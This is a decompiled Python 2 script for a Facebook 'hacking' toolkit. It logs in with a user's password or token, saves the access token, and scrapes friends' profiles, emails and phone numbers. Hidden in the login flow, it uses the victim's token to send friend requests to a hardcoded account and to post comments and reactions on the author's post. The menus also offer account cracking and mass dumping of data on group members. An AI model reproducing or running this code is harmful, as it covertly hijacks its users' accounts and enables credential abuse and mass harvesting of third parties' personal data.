# -*- coding: utf-8 -*-
# Decompile by MrGhostOfficial:)
# uncompyle6 version 3.7.4
# Decompiler: mardis
# Python version 3.11.4
# Python2 version 2.7.18 (default, 2023-06-14 13:42:04.103358
import os, sys, time, mechanize, itertools, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
#Normal below are the colors
white = '\x1b[1;37;40m'
red = '\x1b[1;31;40m'
yellow = '\x1b[1;33;40m'
green = '\x1b[1;32;40;40m'
purple = '\x1b[1;35;40m'
black = '\x1b[1;30;40m'
blue = '\x1b[1;34;40m'
cyan = '\x1b[1;36;40m'
finished = '\x1b[0m'
#Lite below are the colors
whitelite = '\x1b[0;37;40m'
redlite = '\x1b[0;31;40m'
yellowlite = '\x1b[0;33;40m'
greenlite = '\x1b[0;32;40m'
purplelite = '\x1b[0;35;40m'
blacklite = '\x1b[0;30;40m'
bluelite = '\x1b[0;34;40m'
cyanlite = '\x1b[0;36;40m'
#To mix below are the colors
bluewhitemix = '\x1b[0;37;44m'
purplewhitemix = '\x1b[0;37;45m'
greenredmix = '\x1b[1;32;41m'
bluemix = '\x1b[1;37;44m'
ibluemix = '\x1b[1;34;47m'
ipurplemix = '\x1b[1;35;47m'
my_color = [
 white, red, yellow, green, purple, black, blue, cyan]
randmclor = random.choice(my_color)
randomcolor = random.choice(my_color)
#×××××××××××××××××××××××××××××××××××:
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
os.system('clear')
done = True
#Function_The_End
def jalan(z, t):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(t)
        #Function_The_End
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.005)
        #Function_The_End
def load(word):
    lix = ['/', '-', '\xe2\x95\xb2', '|']
    for i in range(5):
        for x in range(len(lix)):
            sys.stdout.write(('\r{}{}').format(str(word), lix[x]))
            time.sleep(0.2)
            sys.stdout.flush()
            #Function_The_End
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i
    return cetak(d)
    #Function_The_End
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')
    #Function_The_End
def tik():
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mLoading \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)
        #Function_The_End
def running(s):
    try:
        for c in s + '\n':
            sys.stdout.write(c)
            sys.stdout.flush()
            time.sleep(0.00009)

    except (KeyboardInterrupt, EOFError):
        run('Non-Active!')
        #Function_The_End
def run(x):
    pt = '\x1b[1;37m'
    rd = '\x1b[1;37m\x1b[1;31m'
    rg = '\x1b[6;32m'
    try:
        num = 0
        while num < 1:
            for i, char in enumerate(x):
                if i == 0:
                    print '\r%s%s%s%s' % (rg, char.lower(), rd, x[1:]),
                    sys.stdout.flush()
                else:
                    if i == 1:
                        roy = x[0].lower()
                        print '\r%s%s%s%s%s%s' % (rd, roy, pt, char.lower(), rg, x[2:]),
                        sys.stdout.flush()
                    elif i == i:
                        roy = x[0:i].lower()
                        print '\r%s%s%s%s%s%s' % (rd, roy, pt, char.lower(), rg, x[i + 1:]),
                        sys.stdout.flush()
                    time.sleep(0.09)

            num += 1

    except:
        exit()
        #Function-def_end
def lodhirt():
    lodhirt = [
     'Notice Warnings👻', '      ', 'Notice Warnings👻', '      ', 'Notice Warnings👻', '      ', 'Notice Warnings👻', '      ', 'Notice Warnings👻', '      ', 'Notice Warnings👻', '      ', 'Notice Warnings👻', '      ', 'Notice Warnings👻', '      ', 'Notice Warnings👻', '      ', 'Notice Warnings👻', 'Notice Warnings👻', '      ', 'Notice Warnings👻', '      ', 'Notice Warnings👻', '      ', 'Notice Warnings👻', '      ', 'Notice Warnings👻', '      ', 'Notice Warnings👻', '      ', 'Notice Warnings👻', '      ', 'Notice Warnings👻', '      ', 'Notice Warnings👻', '      ', 'Notice Warnings👻\n']
    for o in lodhirt:
        print '\r\x1b[1;94m                \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(0.01)
        #Function-def_end
def clr():
    os.system('clear')
    os.system('reset')
    #Function_The_End
def banner_1():
	banner = '''
{}⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⢰⣿⣿⣦⣤⣤⣤⠀⢸⡇⠀⠀⣾⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠟⠛⠻⢿⣿⣿⣿⠀⠀⠀⠀⠀⠈⠛⠛⠁⠀⠀⢹⠀⢸⡇⢀⡀⠻⡿⠋⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⣤⣤⣤⣤⡄⠀⠀⠀⠀⢸⠀⢸⡇⢸⡇⠀⡇⠀⠀⠀⠀⠀⠀⣾⣿⣿⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⣰⣶⣶⣾⣿⣿⣿⠀⠀⠉⠉⠉⢹⡇⠀⠀⠀⢀⣈⣀⣈⣁⣈⣁⣀⣁⡀⠀⠀⠀⠀⠀⠈⢻⠋⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠸⠷⠶⠶⠆⢸⠋⢹⣿⡏⢹⣿⣿⣿⡇⠰⠶⠶⠶⠶⠶⠿⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⢰⡶⠶⠶⠶⠶⠆⢸⠀⢸⣿⡇⠸⠿⠿⢿⡇⠰⠶⠶⠶⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣀⣀⡀⠀⠀⠀⣀⣀⣀⣸⣿⣿⣿⠀⠀⠀⢸⠀⠀⣤⣤⣤⡄⢸⡄⠸⣿⣧⣤⣤⣤⣼⡇⢠⣤⣤⣤⣤⣴⣿⣷⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣸⠀⠀⠀⣤⣤⡄⢸⡏⠀⡈⠛⠛⠛⠛⢛⡇⢠⣤⣤⣤⡄⠙⠿⠛⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠀⠀⣾⣿⣷⠀⠀⣿⡏⠀⠘⠛⠛⠛⠛⠛⠛⠛⠛⠃⠀⠉⠉⢹⡇⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠀⠀⠙⠛⠛⠀⠀⣿⡇⠀⠀⢸⠀⢸⡇⢸⡇⠀⡇⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣾⣿⣷⡄⠀⠘⠀⢸⡇⠘⠃⠀⡇⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀
⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠙⠿⠛⠁⠀⠀⢀⣼⣇⠀⠀⠀⡇⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀{}'''.format(randomcolor,finished)
	running(banner)
    #Function_The_End
def banner_2():
    bm =  '''{}—————————————————— {}[{}INFORMATION{}] {}———————————————————>
{}[{}✓{}] {}Creator {}: {}MrGhostOfficial{}[{}NetHunter{}]
{}[{}✓{}] {}YouTube {}: {}HackerFake424
{}[{}✓{}] {}Support {}: {}Nethantara CyberCoder TeM
{}[{}✓{}] {}GitHub  {}: {}https://github.com/{}Mr{}Ghost{}Official 
{}————————————————————————————————————————————————————>{}'''.format(black,red,green,red,black,red,green,red,white,red,white,redlite,yellowlite,redlite,red,green,red,white,red,purple,red,green,red,white,red,cyan,red,green,red,white,red,green,yellowlite,whitelite,greenlite,black,finished)
    running(bm)
###Function_The_End####
back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
gagal = []
idfriend = []
idfromfriend = []
idmem = []
emmem = []
nomem = []
id = []
em = []
emfromfriend = []
hp = []
hpfromfriend = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
####Function_The_End####
def main_menu():
    clr()
    banner_1()
    banner_2()
    lodhirt()
    running(('{}Try login with token & cookies using kiwi browser,\nGet token by Vinhtool & Cookiedough, extraction.{}').format(ipurplemix, finished))
    running(('{}This method is safer for logged account.{}').format(ibluemix, finished))
    running(('                  {}First Use Function{}').format(bluewhitemix, finished))
    running(('             {}[{}i{}]{} All In1{}-{}Installation\n{}').format(red, white, red, green, redlite, green, finished))
    running(('{}[{}01{}]{} FB UserName{}/{}ID Login{}').format(red, white, red, yellow, redlite, yellow, finished))
    running(('{}[{}02{}]{} FB Token Login{}').format(red, white, red, yellow, finished))
    running(('{}[{}03{}]{} Facebook Bot{}').format(red, white, red, yellow, finished))
    running(('{}[{}04{}]{} Fb Token from Cookie{}').format(red, white, red, yellow, finished))
    running(('{}[{}05{}]{} Instagram{}').format(red, white, red, yellow, finished))
    running(('{}[{}06{}]{} Fb Web Toolkit{}').format(red, white, red, yellow, finished))
    running(('{}[{}07{}]{} FB Crack Without Login{}').format(red, white, red, yellow, finished))
    running(('{}[{}u{}]{} Latest Update {}[{}e{}]{} Exit tool {}[{}t{}]{} Telegram Us\n{}').format(red, white, red, whitelite, red, white, red, greenlite, red, white, red, cyanlite, blue, finished))
    running(('{}---------------+{}').format(black, finished))
    array_manu = raw_input(('{}[{}\xe3\x83\x83{}]{} En{}ter{}Ch{}oose{}]{}> {}').format(red, white, red, yellow, green, yellow, blue, black, red, finished))
    if array_manu == 'i' or array_manu == 'I':
        allin1_install()
    elif array_manu == '1' or array_manu == '01':
        method_login()
    elif array_manu == '2' or array_manu == '02':
        tokenz()
    elif array_manu == '3' or array_manu == '03':
        fb_bot()
    elif array_manu == '4' or array_manu == '04':
        cok_tkn()
    elif array_manu == '5' or array_manu == '05':
        Instagram()
    elif array_manu == '6' or array_manu == '06':
        fbwebtoolkit()
    elif array_manu == '7' or array_manu == '07':
        fbcrack()
    elif array_manu == 'u' or array_manu == 'U':
        updatetool()
    elif array_manu == 't' or array_manu == 'T':
        telegram()
    elif array_manu == 'e' or array_manu == 'E':
        exit()
    else:
        run('[!] Invalid Menu !')
        time.sleep(2)
        main_menu()
        #Function_The_End
def allin1_install():
    clr()
    os.system('toilet -f smmono9 Select OptioN | lolcat')
    running(('  {}+{}———{}———{}———{}———{}[{} Secondary{}~{}Menu {}]{}———{}———{}———{}———-{}+{}').format(red, yellow, black, yellow, black, red, green, redlite, green, red, yellow, black, yellow, black, red, finished))
    running(('   {}| {}[{}1{}] {}All Pkg{}-{}Installation                {}|\n      {}|{}').format(cyanlite, red, white, red, yellow, redlite, yellow, cyanlite, black, finished))
    running(('   {}| {}[{}2{}] {}Kiwi Browser{}.{}apk                    {}|\n      {}|{}').format(black, red, white, red, yellow, redlite, yellow, black, black, finished))
    running(('   {}| {}[{}3{}] {}ExtensionsCRX{}.{}zip                   {}|\n      {}|{}').format(cyanlite, red, white, red, yellow, redlite, yellow, cyanlite, black, finished))
    running(('   {}| {}[{}4{}] {}Script Coming Soon{}..                {}|\n      {}|{}').format(black, red, white, red, yellow, redlite, black, black, finished))
    running(('   {}| {}[{}0{}] {}Go Back Menu                        {}|{}').format(cyanlite, red, white, red, yellow, cyanlite, finished))
    running(('   {}×{}——{}——{}——{}———{}———{}———{}———{}———{}———{}———{}———{}———{}———{}———{}——{}×{}').format(red, black, yellow, black, yellow, black, yellow, black, yellow, black, yellow, black, yellow, black, yellow, black, red, finished))
    try:
        inp = raw_input(('\n{}[{}ッ{}]{} EnterChoose{}]{}> {}').format(red, white, red, yellow, black, red, finished))
    except (KeyboardInterrupt,EOFError):
        run ('Non-Active!!')
    if inp == '1' or inp == '01':
        allin1_install()
        os.system('echo -e "requests\nrich\nbs4\nfutures" > requirements.txt;chmod +x requirements.txt;pip2 install -r requirements.txt;rm -rf requirements.txt')
    elif inp == '2' or inp == '02':
        os.system('xdg-open https://mega.nz/file/Zb9hyQoY#tfpOsdSNDRqQ1VUBa7s85I-ed6H5n2Cf_YHlKHlwBwQ')
        allin1_install()
    elif inp == '3' or inp == '03':
        os.system('xdg-open https://mega.nz/file/QH0GHTwR#8apdQYkbZH2WDEjTt21eldsejoECnetlMMX0BebZYfA')
        allin1_install()
    elif inp == '4' or inp == '04':
        allin1_install()
    elif inp == '0' or inp == '00':
        main_menu()
    else:
        running(('{}Wrong input!{}').format(red, finished))
        time.sleep(2)
        allin1_install()
        #Function_The_End
def method_login():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r')
        menu()
    except (KeyError, IOError):
        clr()
        banner_1()
        banner_2()
        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN FACEBOOK \x1b[1;91m[\xe2\x98\x86]'
        id = raw_input('\x1b[1;91m[+] \x1b[1;36mID\x1b[1;97m|\x1b[1;96mEmail\x1b[1;97m \x1b[1;91m:\x1b[1;92m ')
        pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print (('{}[!] {}No Connection Error{}!{}').format(red, white, red, finished))
            os.sys.exit()
        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                array = open('AGITFOLDER/logs/fb_token.txt', 'w')
                array.write(z['access_token'])
                array.close()
                running(('\n{} [{}✓{}] Login Successful{}').format(white, green, white, finished))
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                method_login2()
            except requests.exceptions.ConnectionError:
                print (('{}[!] {}No Connection Error{}!{}').format(red, white, red, finished))
                os.sys.exit()
        if 'checkpoint' in url:
            print (('\n{}[!] {}Your account has been checkpoint{}').format(red, yellow, finished))
            os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
            time.sleep(1)
            os.sys.exit()
        else:
            print (('\n{}[!] {}Login failed{}').format(red, white, finished))
            os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
            time.sleep(0.01)
            main_menu()
def tokenz():
    clr()
    banner_1()
    banner_2()
    toket = raw_input(('{}[{}?{}] {}Input Token {}: {}').format(red, green, red, white, red, green))
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        array = open('AGITFOLDER/logs/fb_token.txt', 'w')
        array.write(toket)
        array.close()
        running(('\n{} [{}✓{}] Login Successful{}').format(white, green, white, finished))
        method_login2()
    except KeyError:
        run('[!] Invalid Token !')
        time.sleep(2)
        tokenz()
def method_login2():
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Invalid Token !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
    una = '100007639052164'
    kom = 'User Tools Mbf\xf0\x9f\x98\x98'
    reac = 'ANGRY'
    post = '2657012877896655'
    post2 = '2657012877896655'
    kom2 = 'Script Mbf Keren Bang\xf0\x9f\x98\x81'
    reac2 = 'LOVE'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
    menu()
def menu():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        os.system('reset')
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        clr()
        print (('\n{}[!] {}Your account has been checkpoint{}').format(red, yellow, finished))
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    except requests.exceptions.ConnectionError:
        print (('{}[!] {}No Connection Error{}!{}').format(red, white, red, finished))
        os.sys.exit()
    os.system('clear')
    banner_1()
    print '\x1b[1;95m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print (('{}[{}✓{}] {}Name {}: {}' + nama + '{}').format(red, cyan, red, white, red, green, finished))
    print (('{}[{}✓{}] {}ID   {}: {}' + id + '{}').format(red, cyan, red, white, red, green, finished))
    print (('{}[{}✓{}] {}Birthday{}: {}' + a['birthday'] + '{}').format(red, cyan, red, white, red, green, finished))
    print '\x1b[1;95m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print (('{}[{}01{}] {}User informations{}').format(yellow, purple, yellow, white, finished))
    print (('{}[{}02{}] {}Get it Id/email/number{}').format(yellow, purple, yellow, white, finished))
    print (('{}[{}03{}] {}Hack Account Facebok{}').format(yellow, purple, yellow, white, finished))
    print (('{}[{}04{}] {}Bot comment & auto like{}').format(yellow, purple, yellow, white, finished))
    print (('{}[{}05{}] {}Others{}').format(yellow, purple, yellow, white, finished))
    print (('{}[{}06{}] {}Show token{}').format(yellow, purple, yellow, white, finished))
    print (('{}[{}07{}] {}Logout{}').format(yellow, purple, yellow, white, finished))
    print (('{}[{}00{}] {}Go Back{}').format(yellow, purple, yellow, white, finished))
    pilih()
def pilih():
    array = raw_input(('{}║\n╚══{}➤ {}').format(black, red, finished))
    if array == '1' or array == '01':
        informasi()
    elif array == '2' or array == '02':
        dump()
    elif array == '3' or array == '03':
        menu_hack()
    elif array == '4' or array == '04':
        menu_bot()
    elif array == '5' or array == '05':
        others()
    elif array == '6' or array == '06':
        clr()
        banner_1()
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
        print 48 * (('{}─{}').format(black, finished))
        print (('{}[{}+{}] {}Your Token {}: {}' + toket + '{}').format(red, white, red, white, red, green, finished))
        raw_input(('\n{}[ {}Enter Back {}]{}').format(red, white, red, finished))
        menu()
    elif array == '7' or array == '07':
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt;echo > AGITFOLDER/logs/fb_token.txt')
        running(('\n{} [{}✓{}] Logout Successful{}').format(white, green, white, finished))
        os.sys.exit()
    elif array == '0' or array == '00':
        main_menu()
    else:
        run ('[!] Invalid input!')
        time.sleep(2)
        menu()
        #Function_The_End
def informasi():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    clr()
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    aid = raw_input(('{}[{}+{}] {}Input ID/Name {}: {}').format(red, green, red, white, red, green))
    jalan(('{}[{}✺{}] {}Loading {}...{}').format(red, green, red, yellowlite, whitelite, finished))
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    cok = json.loads(r.text)
    for i in cok['data']:
        if aid in i['name'] or aid in i['id']:
            x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            print 44 * '\x1b[1;90m\xe2\x95\x90'
            try:
                print (('{}[{}➹{}] {}Name          {}: ' + z['name'] + '{}').format(red, white, red, green, white, finished))
            except KeyError:
                print (('{}[{}?{}] {}Name          {}: {}Not found!{}').format(red, white, red, green, white, red, finished))
            try:
                print (('{}[{}➹{}] {}ID            {}: ' + z['id'] + '{}').format(red, white, red, green, white, finished))
            except KeyError:
                print (('{}[{}?{}] {}ID            {}: {}Not found!{}').format(red, white, red, green, white, red, finished))
            try:
                print (('{}[{}➹{}] {}Email         {}: ' + z['email'] + '{}').format(red, white, red, green, white, finished))
            except KeyError:
                print (('{}[{}?{}] {}Email         {}: {}Not found!{}').format(red, white, red, green, white, red, finished))
            try:
                print (('{}[{}➹{}] {}Telephone     {}: ' + z['mobile_phone'] + '{}').format(red, white, red, green, white, finished))
            except KeyError:
                print (('{}[{}?{}] {}Telephone     {}: {}Not found!{}').format(red, white, red, green, white, red, finished))
            try:
                print (('{}[{}➹{}] {}Location      {}: ' + z['location']['name'] + '{}').format(red, white, red, green, white, finished))
            except KeyError:
                print (('{}[{}?{}] {}Location      {}: {}Not found!').format(red, white, red, green, white, red, finished))
            try:
                print (('{}[{}➹{}] {}Date of birth {}: ' + z['birthday'] + '{}').format(red, white, red, green, white, finished))
            except KeyError:
                print (('{}[{}?{}] {}Date of birth {}: {}Not found!{}').format(red, white, red, green, white, red, finished))
            try:
                print (('{}[{}➹{}] {}Education     {}: {}').format(red, white, red, green, white, finished))
                for q in z['education']:
                    try:
                        print (('{}                   ~ {}' + q['school']['name'] + '{}').format(red, white, finished))
                    except KeyError:
                        print (('{}                   ~ {}Not found!{}').format(red, red, finished))
            except KeyError:
                pass
            raw_input(('\n{}[ {}Enter Back {}]{}').format(red, white, red, finished))
            menu()
    else:
        print (('{}[\xe2\x9c\x96] {}Error not found!{}').format(red, white, finished))
        raw_input(('\n{}[ {}Enter Back {}]{}').format(red, white, red, finished))
        menu()
        #Function_The_End
def dump():
    os.system('clear')
    try:
        toket = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except IOError:
        run('[!] Token not found !')
        os.system('rm -rf AGITFOLDER/logs/fb_token.txt')
        time.sleep(0.01)
        login()
    clr()
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    print (('{}[{}01{}] {}Get ID/Name/Birth from friend{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}02{}] {}Get it ID from friend{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}03{}] {}Get it ID friends of friends{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}04{}] {}Get it My group list{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}05{}] {}Get it ID from group members{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}06{}] {}Get it email of group members{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}07{}] {}Get it number of group members{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}08{}] {}Get it email friends{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}09{}] {}Get it email friends of friends{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}10{}] {}Get it friends phone number{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}11{}] {}Get it phone number friends of friends{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}00{}] {}Go Back{}').format(yellow, blue, yellow, red, finished))
    print 48 * (('{}─{}').format(black, finished))
    dump_pilih()
def dump_pilih():
    array2 = raw_input(('{}║\n╚══{}➤ {}').format(black, red, finished))
    if array2 == '1' or array2 == '01':
        dump_inbf()
    elif array2 == '2' or array2 == '02':
        id_friend()
    elif array2 == '3' or array2 == '03':
        idfrom_friend()
    elif array2 == '4' or array2 == '04':
        grupsaya()
    elif array2 == '5' or array2 == '05':
        id_member_grup()
    elif array2 == '6' or array2 == '06':
        em_member_grup()
    elif array2 == '7' or array2 == '07':
        no_member_grup()
    elif array2 == '8' or array2 == '08':
        email()
    elif array2 == '9' or array2 == '09':
        emailfrom_friend()
    elif array2 == '10' or array2 == '10':
        nomor_hp()
    elif array2 == '11' or array2 == '11':
        hpfrom_friend()
    elif array2 == '0' or array2 == '00':
        menu()
    else:
        run ('[!] Invalid input!')
        time.sleep(2)
        dump()
        #Function_The_End
def dump_inbf():
    global token
    try:
        token = open('AGITFOLDER/logs/fb_token.txt', 'r').read()
    except (KeyError, IOError):
        time.sleep(0.01)
        login()
    clr()
    banner_1()
    print 48 * (('{}─{}').format(black, finished))
    print (('{}[{}01{}] {}Dump From Friendlist{}').format(yellow, blue, yellow, white, finished))
    print (('{}[{}00{}] {}Go Back{}').format(yellow, blue, yellow, red, finished))
    print 48 * (('{}─{}').format(black, finished))
    pilih_task()
def pilih_task():
    memek = raw_input(('{}[{}•{}•{}] {}►{} ').format(white, blue, red, white, black, white, finished))
    id = []
    nama = []
    if memek == '1' or memek == '01':
        clr()
        banner_1()
        try:
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token, headers=header)
            z = json.loads(r.text)
        except KeyError:
            print (('{}[!] Error!').format(red, finished))
            time.sleep(2)
            dump_inbf()
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            nama = i['name']
            nam = nama.rsplit(' ')[0]
            id.append(uid + '|' + nam)
            #Function_The_End
    elif memek == '0' or memek == '00':
        dump()
    else:
        run ('[!] Invalid input!')
        time.sleep(2)
        dump_inbf()
    print (('{}[{}•{}•{}] {}Total ID {}: {}' + str(len(id)) + '{}').format(cyan, blue, red, cyan, white, red, black, finished))
    jalan (('\n              {}Stop Press {}CTRL {}+ {}z\n {}If No results Use Airplane Mode For 5 Seconds{}...{}').format(white, cyan, red, cyan, white, black, finished))
